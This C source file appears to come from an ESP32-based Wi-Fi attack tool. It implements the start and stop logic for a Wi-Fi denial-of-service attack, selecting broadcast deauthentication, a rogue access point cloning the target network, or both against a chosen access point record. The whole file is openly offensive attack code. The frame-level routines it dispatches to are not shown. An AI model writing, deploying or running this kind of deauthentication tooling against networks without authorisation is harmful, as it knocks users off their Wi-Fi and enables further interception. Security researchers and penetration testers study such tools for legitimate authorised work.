/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "main/attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "main/attack.h"
#include "main/attack_method.h"
#include "components/wifi_controller/wifi_controller.h"
#include "components/system_manager.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = (attack_dos_methods_t)-1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    method = (attack_dos_methods_t)attack_config->method;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
            attack_method_broadcast(attack_config->ap_record, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config->ap_record);
            attack_method_broadcast(attack_config->ap_record, 1);
            break;
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
    }
}

void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            SystemManager::getInstance().wificontrollerInterface->wifictl_mgmt_ap_start();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            SystemManager::getInstance().wificontrollerInterface->wifictl_mgmt_ap_start();
            SystemManager::getInstance().wificontrollerInterface->wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    ESP_LOGI(TAG, "DoS attack stopped");
}